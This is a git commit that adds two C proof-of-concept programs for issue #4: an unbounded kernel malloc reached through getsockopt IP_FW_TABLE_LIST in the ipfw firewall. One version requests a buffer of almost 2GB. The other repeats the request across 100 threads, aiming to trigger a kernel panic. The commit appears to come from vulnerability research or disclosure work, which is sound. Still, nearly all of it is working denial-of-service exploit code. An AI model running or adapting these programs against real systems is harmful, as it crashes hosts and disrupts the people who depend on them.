b09c89a01145afd60ef300ab55fc20e1f08ced17
Michael Smith <m@michaelsmith.be>
2025-09-09 13:01:45 +0200

    Add poc for #4 unbounded malloc() in IP_FW_TABLE_LIST

---
+++ poc/4-kernel-panic-unbounded-malloc/main-multithreaded.c
@@ -0,0 +1,93 @@
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <net/if.h>
+#include <netinet/in.h>
+#include <netinet/ip_fw.h>
+#include <arpa/inet.h>
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <errno.h>
+#include <pthread.h>
+
+#define THREADS 100
+#define TABLE_SIZE 0x7FFFFF00
+
+struct ipfw_table_entry {
+    struct in_addr addr;
+    u_int32_t masklen;
+};
+
+struct ipfw_table {
+    u_int32_t tbl;
+    u_int32_t cnt;
+    struct ipfw_table_entry ent[0];
+};
+
+// NOTE(m): Requires ipfw kernel module to be loaded in host
+/*
+sysrc firewall_enable="YES"
+sysrc firewall_type="open"
+*/
+
+// TODO(m): Clean this code up
+
+void *thread_func(void *arg) {
+    int sock;
+    struct ipfw_table *tbl;
+    socklen_t len;
+
+    sock = socket(AF_INET, SOCK_RAW, 0);
+    if (sock < 0) {
+        perror("socket");
+        return NULL;
+    }
+
+    len = TABLE_SIZE;
+    tbl = malloc(len);
+    if (!tbl) {
+        perror("malloc");
+        close(sock);
+        return NULL;
+    }
+
+    tbl->tbl = 1; // table number to list
+
+    socklen_t l = len;
+    if (getsockopt(sock, IPPROTO_IP, IP_FW_TABLE_LIST, tbl, &l) < 0) {
+        perror("getsockopt IP_FW_TABLE_LIST");
+        free(tbl);
+        close(sock);
+        return NULL;
+    }
+
+    printf("Thread %lu: entries = %u\n", pthread_self(), tbl->cnt);
+    for (u_int32_t i = 0; i < tbl->cnt; i++) {
+        char buf[INET_ADDRSTRLEN];
+        inet_ntop(AF_INET, &tbl->ent[i].addr, buf, sizeof(buf));
+        printf("Thread %lu: %s/%u\n", pthread_self(), buf, tbl->ent[i].masklen);
+    }
+
+    free(tbl);
+    close(sock);
+    return NULL;
+}
+
+int main() {
+    pthread_t threads[THREADS];
+
+    for (int i = 0; i < THREADS; i++) {
+        if (pthread_create(&threads[i], NULL, thread_func, NULL) != 0) {
+            perror("pthread_create");
+            return 1;
+        }
+    }
+
+    for (int i = 0; i < THREADS; i++) {
+        pthread_join(threads[i], NULL);
+    }
+
+    return 0;
+}
---
+++ poc/4-kernel-panic-unbounded-malloc/main.c
@@ -0,0 +1,84 @@
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <net/if.h>
+#include <netinet/in.h>
+
+#define IPFW_TABLES_MAX        128
+
+struct ipfw_table_entry {
+    struct in_addr addr;   /* IPv4 address */
+    u_int32_t      masklen;/* masklen for subnet */
+};
+
+struct ipfw_table {
+    u_int32_t      tbl;    /* table number */
+    u_int32_t      cnt;    /* # of entries */
+    struct ipfw_table_entry ent[0]; /* variable size array */
+};
+
+
+#include <netinet/ip_fw.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <errno.h>
+#include <arpa/inet.h>
+
+// NOTE(m): Requires ipfw kernel module to be loaded in host
+/*
+sysrc firewall_enable="YES"
+sysrc firewall_type="open"
+*/
+
+int main() {
+    int sock;
+    struct ipfw_table *tbl;
+    socklen_t l;
+    int i;
+
+    sock = socket(AF_INET, SOCK_RAW, 0);
+    if (sock < 0) {
+        perror("socket");
+        exit(EXIT_FAILURE);
+    }
+
+    // allocate space for up to 128 entries
+    // l = sizeof(struct ipfw_table) + 128 * sizeof(struct ipfw_table_entry);
+
+    // TODO(m): Figure out why l and huge are related? Cfc. "Bad address" error.
+    l = 0x7FFFFF00;
+    tbl = malloc(l);
+    if (!tbl) {
+        perror("malloc");
+        close(sock);
+        return 1;
+    }
+
+    // memset(tbl, 0, l);
+
+    tbl->tbl = 1;  // table number you want to list
+
+    socklen_t huge = 0x7FFFFF00;
+
+    int error;
+    if ((error = getsockopt(sock, IPPROTO_IP, IP_FW_TABLE_LIST, tbl, &huge)) < 0) {
+        printf("%d\n", error);
+        printf("%d\n", errno);
+        perror("setsockopt IP_FW_TABLE_LIST");
+        close(sock);
+        exit(EXIT_FAILURE);
+    }
+
+    // We don't really care about the below because we hope to never get there
+    printf("Entries in table %u:\n", tbl->tbl);
+    for (i = 0; i < tbl->cnt; i++) {
+        char buf[INET_ADDRSTRLEN];
+        inet_ntop(AF_INET, &tbl->ent[i].addr, buf, sizeof(buf));
+        printf("  %s/%u\n", buf, tbl->ent[i].masklen);
+    }
+
+    free(tbl);
+    close(sock);
+    return 0;
+}
